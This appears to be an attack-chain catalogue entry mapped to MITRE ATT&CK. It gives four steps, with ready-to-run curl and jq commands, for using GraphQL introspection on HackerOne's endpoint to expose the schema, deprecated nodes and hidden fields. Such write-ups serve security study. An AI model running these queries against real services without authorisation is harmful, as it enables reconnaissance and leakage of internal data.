---
id: ac-graphql-introspection-hackerone
tags:
  - graphql
  - introspection
  - information-disclosure
  - api-leak
  - schema-exposure
type: attack_chain
tools: []
tactics:
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
  - GraphQL
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Perform-GraphQL-Introspection-Query]]'
  - '[[procedures/Analyze-Schema-for-Deprecated-Nodes]]'
  - '[[procedures/Query-Deprecated-Root-Nodes]]'
  - '[[procedures/Access-Hidden-GraphQL-Fields]]'
step_count: 4
techniques:
  - '[[Gather Victim Host Information]]'
  - '[[Vulnerability Scanning]]'
updated_at: '2025-12-14T17:25:53.450Z'
description: >-
  Multi-stage attack exploiting enabled GraphQL introspection on a public
  endpoint to disclose full schema, deprecated nodes, and hidden fields,
  enabling targeted information leakage.
skill_level: intermediate
impact_level: medium
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Gather Victim Host Information]]'
  - '[[Vulnerability Scanning]]'
---
# GraphQL Introspection Leak Exposing Schema and Hidden Fields on HackerOne

Multi-stage attack chain demonstrating exploitation of GraphQL introspection enabled on the public HackerOne endpoint, allowing schema disclosure, access to deprecated nodes like Team and Report, and querying of hidden fields such as SLA metrics, leading to information disclosure of backend details and potential future implementation leaks.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Send Introspection Query] --> B[Analyze Schema]
    B --> C[Query Deprecated Nodes]
    C --> D[Access Hidden Fields]
    D --> E[Review Leaks]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP clients like curl)

### Target Environment

- Web platform with GraphQL API endpoint
- Publicly accessible GraphQL server (e.g., https://hackerone.com/graphql)
- No authentication required for introspection

### Initial Access Requirements

- Internet access to the target endpoint
- No credentials needed
- Basic knowledge of GraphQL queries

## Detailed Attack Procedures

### Step 1: Perform Introspection Query
procedure: [[procedures/Perform-GraphQL-Introspection-Query]]

**Objective**: Retrieve the full GraphQL schema to understand backend structure, types, fields, and deprecations.

**Instructions**: Use [[commands/graphql-introspection-query]] to send a POST request to the endpoint:

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query IntrospectionQuery {__schema {queryType { name },mutationType { name },subscriptionType { name },types {...FullType},directives {name,description,args {...InputValue},onOperation,onFragment,onField}}}\nfragment FullType on __Type {kind,name,description,fields(includeDeprecated: true) {name,description,args {...InputValue},type {...TypeRef},isDeprecated,deprecationReason},inputFields {...InputValue},interfaces {...TypeRef},enumValues(includeDeprecated: true) {name,description,isDeprecated,deprecationReason},possibleTypes {...TypeRef}}\nfragment InputValue on __InputValue {name,description,type { ...TypeRef },defaultValue}\nfragment TypeRef on __Type {kind,name,ofType {kind,name,ofType {kind,name,ofType {kind,name}}}}")}' -o schema.json
```

**Expected Output**: JSON file containing the complete schema with types, fields, deprecations, and descriptions.

**Success Indicators**:
- Schema response received without errors
- Presence of __schema object in output

### Step 2: Analyze Schema for Deprecated Nodes
procedure: [[procedures/Analyze-Schema-for-Deprecated-Nodes]]

**Objective**: Identify deprecated root-level nodes and hidden fields from the schema to target for further queries.

**Instructions**: Parse the schema.json file manually or with jq to find deprecated fields:

```bash
jq '.data.__schema.types[] | select(.fields[]? | .isDeprecated == true)' schema.json > deprecated.json
```

Look for nodes like 'team', 'report', 'user' with isDeprecated: true and deprecation reasons.

**Expected Output**: List of deprecated nodes and fields, e.g., team with deprecation reason.

**Success Indicators**:
- Deprecated nodes identified (e.g., Team, Report)
- Deprecation reasons revealing internal details

### Step 3: Query Deprecated Root Nodes
procedure: [[procedures/Query-Deprecated-Root-Nodes]]

**Objective**: Execute queries on deprecated root nodes to access unintended data like team details.

**Instructions**: Use [[commands/query-deprecated-team-node]] to fetch team information:

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){id,_id,about,base_bounty,bug_count}}"}' -o team_data.json
```

**Expected Output**: JSON with team data, e.g., {"data": {"team": {"id": "Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=", "_id": "13", ...}}}

**Success Indicators**:
- Data returned from deprecated node
- Fields like _id (internal PK) exposed

### Step 4: Access Hidden GraphQL Fields
procedure: [[procedures/Access-Hidden-GraphQL-Fields]]

**Objective**: Leverage schema knowledge to query undisclosed fields like SLA metrics.

**Instructions**: Use [[commands/query-hidden-sla-fields]] on the team node:

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){sla_failed_count,sla_missed_count}}"}' -o sla_data.json
```

Review deprecation reasons for future leaks.

**Expected Output**: JSON with hidden metrics, e.g., {"data": {"team": {"sla_failed_count": 0, ...}}}

**Success Indicators**:
- Hidden fields queried successfully
- Internal metrics or future hints disclosed

## Attack Chain Summary

### Key Achievements

1. Full schema disclosure via introspection
2. Access to deprecated nodes bypassing intended restrictions
3. Exposure of hidden fields and internal details like database keys
4. Potential leakage of upcoming features from descriptions

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Gather Victim Host Information]] Gather Victim Host Information
- [[Vulnerability Scanning]] Vulnerability Scanning

### MITRE ATT&CK Tactics

- [[Reconnaissance]] Reconnaissance

---

*Last updated: 2023-10-01T00:00:00Z*
